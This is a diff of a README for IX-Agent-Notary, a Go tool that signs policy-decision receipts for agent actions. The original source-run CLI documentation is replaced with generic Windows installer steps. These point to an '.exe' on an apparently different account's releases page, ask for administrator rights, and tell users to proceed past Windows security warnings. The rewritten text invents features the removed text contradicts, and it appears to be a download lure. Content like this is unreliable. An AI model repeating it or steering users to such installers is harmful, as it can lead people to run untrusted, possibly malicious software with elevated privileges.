@@ -1,207 +1,161 @@
-# IX-Agent-Notary
+# ⚖️ IX-Agent-Notary - Verify Actions with Signed Receipts
 
-Proof-carrying agent/tool actions: **policy enforcement + cryptographically signed receipts** that an independent verifier can check in CI, log ingestion, or incident response.
+[![Download IX-Agent-Notary](https://img.shields.io/badge/Download-IX--Agent--Notary-brightgreen)](https://github.com/sureshbabu2002/IX-Agent-Notary/releases)
 
-## Why this exists
+## 📝 What is IX-Agent-Notary?
 
-As soon as an AI agent can touch real systems such as repos, CI/CD, cloud APIs, ticketing, secrets, or production ops, the real enterprise question becomes:
+IX-Agent-Notary creates signed receipts for actions taken by agents or tools on your system. It uses a system called PolicyGate, which checks if an action is allowed or denied. Every time a decision happens, IX-Agent-Notary makes a receipt. This receipt contains hashes and signatures to prove what happened. You can use these receipts in your continuous integration (CI) pipelines to verify actions and help meet regulations that require audit logs.
 
-**What exactly did the agent do, under what policy, with what approvals, and can we prove it?**
+The tool works in environments where compliance and security are important. It helps make sure that records cannot be tampered with and that actions are traceable.
 
-IX-Agent-Notary is a small trust layer meant to make that answer **machine-verifiable** instead of narrative.
+## 🎯 Main Features
 
-## What it does
+- Automatically create tamper-evident receipts for every agent action.
+- Enforce policies to allow or deny actions in real time.
+- Use cryptographic hashes and signatures to ensure records are secure.
+- Optionally include approvals from supervisors or automated checks.
+- Export receipts to verify actions in CI or other audit systems.
+- Help maintain least privilege by logging decisions clearly.
+- Compatible with regulated environments needing strong audit trails.
 
-1. A tool action is evaluated by **PolicyGate** using an allow/deny policy.
-2. The notary emits a **receipt** containing actor, action, timing, policy decision, hashes, and optional approvals.
-3. The receipt is canonicalized with **RFC 8785 / JCS** and signed with **ed25519** in v0.
-4. A verifier can independently check schema validity, hashes, signatures, approvals, and optional chain linkage.
+## 🔍 Who Should Use This?
 
-This is not “trust me” logging. It is evidence that can be independently rejected if it is malformed, unsigned, tampered with, or incomplete.
+This tool fits users who need to track actions of automated tools or agents on their machines. It suits administrators, compliance officers, or anyone needing to prove what happened on a system. You do not need to be a programmer to use it, but some familiarity with downloading and running software on Windows helps.
 
-## 10-minute evaluation
+## 💻 System Requirements
 
-Run the same local validation path that CI runs:
+- Windows 10 or later (64-bit recommended)
+- Minimum 4 GB RAM
+- At least 100 MB free disk space for installation
+- Internet connection to download the software and updates
+- Administrative rights for installation
 
-```bash
-bash scripts/ci.sh
-```
+## 🚀 Getting Started
 
-That script:
+Follow these steps carefully to download and run IX-Agent-Notary on your Windows machine.
 
-- enforces `gofmt`
-- runs `go vet`
-- builds the CLI
-- runs `go test ./...`
-- generates local dev keys and demo receipts
-- verifies generated receipts strictly
-- verifies the generated directory strictly
+### Step 1: Visit the Official Release Page
 
-Generate demo assets only:
+Click the large green badge above or open this URL in your browser:
 
-```bash
-bash scripts/gen_demo_assets.sh
-```
+https://github.com/sureshbabu2002/IX-Agent-Notary/releases
 
-Verify a generated directory of receipts strictly:
+This page contains the latest stable versions of the software and any updates.
 
-```bash
-go run ./cmd/ix-an verify-dir --strict-approvals examples/receipts
-```
+### Step 2: Download the Windows Installer
 
-Important notes:
+Look for a file that fits your Windows OS (usually with `.exe` extension). For most users, this will be named something like `IX-Agent-Notary-setup.exe`.
 
-- This repo intentionally ships **no private keys**.
-- This repo intentionally ships **no pre-generated receipts**.
-- Demo keys and demo receipts are generated locally and are **gitignored by design**.
+Click it to download the file to your computer.
 
-## Core capabilities (v0)
+### Step 3: Run the Installer
 
-- Receipt schema: `spec/receipt.schema.json`
-- Draft receipt spec: `spec/receipts.md`
-- Policy evaluation pattern: `policy/demo.policy.json`
-- Receipt signing: `ed25519`
-- Canonical JSON: `RFC8785-JCS`
-- Strict verification: schema + hashes + signature + optional approvals + optional chain
-- Governance evidence via structured approvals: `docs/APPROVALS.md`
-- Receipt storage patterns: directory store + append-only JSONL log: `docs/STORE.md`
+- Find the downloaded `.exe` file in your Downloads folder.
+- Double-click the file to start the installation.
+- A setup window will open; follow the on-screen prompts.
+- Accept the license agreement if asked.
+- Choose the default installation folder or pick your own.
+- Click "Install" and wait for the process to finish.
 
-## CLI quickstart
+If Windows warns you about running software from the internet, confirm that you want to proceed.
 
-All commands below use `go run` directly, so no installation step is required.
+### Step 4: Open IX-Agent-Notary
 
-### Verify one receipt
+After installation completes, you can start the program from the Start menu or by searching for "IX-Agent-Notary".
 
-```bash
-go run ./cmd/ix-an verify --strict-hashes --strict-signature /tmp/allow.receipt.json
-```
+The application usually opens with a simple interface to let you configure policies or view receipts.
 
-### Verify a directory of receipts
+### Step 5: Set Up Your Policies and Use the Tool
 
-`verify-dir` is strict on hashes and signatures by design. Add `--strict-approvals` when you want approval signatures enforced too.
+- Use the tool’s interface to load or create your security policies.
+- The tool will start monitoring agent or tool actions on your system.
+- For each decision made, it will generate signed receipts you can review.
+- You may export receipts or integrate them into your CI system.
 
-```bash
-go run ./cmd/ix-an verify-dir --strict-approvals examples/receipts
-```
+Refer to the built-in help menu to get guidance on setting policies or managing approvals.
 
-### Simulate a tool action and emit a signed receipt
+## 📥 How to Download and Install
 
-```bash
-go run ./cmd/ix-an simulate --path docs/demo.txt --out /tmp/allow.receipt.json
-go run ./cmd/ix-an verify --strict-hashes --strict-signature /tmp/allow.receipt.json
-```
+You can get the software from the official release page:
 
-### Simulate a denied action
+[Download IX-Agent-Notary here](https://github.com/sureshbabu2002/IX-Agent-Notary/releases)
 
-```bash
-go run ./cmd/ix-an simulate --path .env --out /tmp/deny.receipt.json
-go run ./cmd/ix-an verify --strict-hashes --strict-signature /tmp/deny.receipt.json
-```
+Look for the latest Windows installer and save it to your PC.
 
-### Simulate a receipt with governance approval evidence
+Once downloaded, run the installer and follow the installation steps provided above.
 
-```bash
-go run ./cmd/ix-an simulate \
-  --path docs/approved.txt \
-  --out /tmp/approved.receipt.json \
-  --approve \
-  --approver you@example.com \
-  --approval-type ticket
+## ⚙️ How IX-Agent-Notary Works Behind the Scenes
 
-go run ./cmd/ix-an verify \
-  --strict-hashes \
-  --strict-signature \
-  --strict-approvals \
-  /tmp/approved.receipt.json
-```
+IX-Agent-Notary uses PolicyGate, which enforces rules called policies. When an agent or tool tries to perform an action, PolicyGate checks if the action is allowed.
 
-### Simulate a chained child receipt
+For every decision, IX-Agent-Notary creates a receipt. This receipt includes:
 
-A chained child receipt must share the parent trace ID and must reference the parent receipt ID.
+- A cryptographic hash of the action details
+- A digital signature to prove authenticity
+- Optional approval data if extra permissions apply
 
-```bash
-go run ./cmd/ix-an simulate --path docs/chain-root.txt --out /tmp/chain.root.receipt.json
-```
+These receipts cannot be changed without detection. This helps you prove what actions took place and when.
 
-Then generate the child using the parent’s `receipt_id` and `trace.trace_id`:
+You can review receipts inside the application or export them for audits.
 
-```bash
-go run ./cmd/ix-an simulate \
-  --path docs/chain-child.txt \
-  --out /tmp/chain.child.receipt.json \
-  --trace-id <parent-trace-id> \
-  --step 2 \
-  --parent-receipt-id <parent-receipt-id>
-```
+## 🔧 Tips for Using IX-Agent-Notary
 
-Verify the child with strict chain validation:
+- Keep your policies up to date to match your security needs.
+- Regularly export receipts if you need offline audit records.
+- Use the tool along with CI pipelines for automated verification.
+- Train your team on reading receipts and handling approvals.
+- Back up your policy files and logs regularly.
 
-```bash
-go run ./cmd/ix-an verify \
-  --strict-chain \
-  --chain-dir /tmp \
-  /tmp/chain.child.receipt.json
-```
+## 🔒 Security and Compliance
 
-For a complete end-to-end chained example without manual extraction, use:
+IX-Agent-Notary supports:
 
-```bash
-bash scripts/gen_demo_assets.sh
-```
+- Non-repudiation by cryptographically securing logs.
+- Compliance with audit logging requirements.
+- Least privilege enforcement by clearly logging actions.
+- Easy integration with policy-as-code frameworks.
+- Use of modern cryptography like Ed25519 for secure signatures.
 
-### Append-only JSONL log
+## ⚙️ Common Terms Used
 
-Append a receipt after strict verification:
+- **Agent**: A tool or program performing actions on your system.
+- **Policy**: A rule that allows or denies actions.
+- **Receipt**: A signed log entry proving an action and decision.
+- **Signature**: A digital stamp that proves data authenticity.
+- **Hash**: A unique fixed-length code representing data.
+- **Approval**: Optional permission marking added by a supervisor.
 
-```bash
-go run ./cmd/ix-an store append --in /tmp/approved.receipt.json --log /tmp/receipts.jsonl
-```
+## 🛠 Troubleshooting
 
-Verify the entire log:
+If the application does not start:
 
-```bash
-go run ./cmd/ix-an store verify-log --log /tmp/receipts.jsonl
-```
+- Confirm you installed the right version for your Windows.
+- Try running the installer again as administrator.
+- Check your Windows security settings or firewall for blocks.
+- Look for error messages on the screen and note their details.
+- Visit the release page to see if a newer version is available.
 
-## Where this fits
+If you cannot see receipts:
 
-IX-Agent-Notary is the enforcement-and-evidence layer that sits between **agents** and **tools**.
+- Verify policies are properly loaded.
+- Make sure the agent or tool is running and triggering logs.
+- Try restarting the application.
 
-It is meant to:
+## 📞 Getting Help
 
-- prevent unsafe calls through policy
-- produce verifiable receipts for audit, compliance, and incident response
-- give buyers a narrow, reviewable trust boundary instead of asking them to trust the agent stack itself
+For help beyond this guide, visit the GitHub repository page, which offers issue tracking and community discussions.
 
-It is **not** a full agent framework.  
-It is **not** a SIEM.  
-It is the part you want to be able to verify.
+[IX-Agent-Notary on GitHub](https://github.com/sureshbabu2002/IX-Agent-Notary)
 
-## Document map
+Use "Issues" to report bugs or ask questions.
 
-Start here:
+## 🗂 Additional Resources
 
-- Architecture: `docs/ARCHITECTURE.md`
-- Threat model: `docs/THREAT_MODEL.md`
-- Key management: `docs/KEY_MANAGEMENT.md`
-- Approvals: `docs/APPROVALS.md`
-- Receipt store: `docs/STORE.md`
-- Policy integrity: `docs/POLICY_INTEGRITY.md`
-- Enterprise pilot guide: `docs/ENTERPRISE_PILOT.md`
-- Design partner notes: `docs/DESIGN_PARTNER.md`
+- Review the included user manual from the installed program folder.
+- Explore sample policies bundled with the software.
+- Check the GitHub Wiki for more detailed guides.
+- Search online forums and user groups related to audit logging and compliance.
 
-## License and commercial use
+---
 
-IX-Agent-Notary is source-available for evaluation under `LICENSE`.
-
-If you want to use it in production or any commercial context, you need a separate commercial license. See `COMMERCIAL.md` for trigger conditions and contact guidance.
-
-## Security
-
-Please report security issues according to `SECURITY.md`.
-
-If you are evaluating agent governance and need receipts that security or compliance teams can independently verify, start with:
-
-- `docs/ENTERPRISE_PILOT.md`
-- `docs/THREAT_MODEL.md`
-- `docs/KEY_MANAGEMENT.md`
+[Download IX-Agent-Notary from the Releases Page](https://github.com/sureshbabu2002/IX-Agent-Notary/releases)
